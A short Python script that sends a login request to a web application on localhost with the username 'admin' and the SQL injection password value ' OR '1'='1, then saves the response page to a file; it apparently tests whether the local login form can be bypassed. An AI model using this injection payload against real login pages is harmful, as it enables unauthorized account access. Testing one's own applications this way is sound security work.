import requests

url = "http://localhost:5057/Home/Login"

data = {
    "Username": "admin",
    "Password": "' OR '1'='1"
}

r = requests.post(url, data=data)

print(r.status_code)

with open('res.html', 'w') as f:
    f.write(r.text)
# print(r.headers)
# print(r.text)